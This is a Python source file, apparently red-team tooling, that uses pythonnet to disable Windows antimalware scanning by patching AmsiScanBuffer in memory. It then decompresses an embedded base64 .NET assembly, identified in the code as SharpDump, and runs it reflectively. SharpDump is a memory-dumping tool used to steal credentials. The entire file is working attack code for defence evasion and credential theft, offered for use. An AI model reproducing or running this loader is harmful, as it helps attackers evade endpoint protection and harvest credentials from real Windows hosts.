import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpDump.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()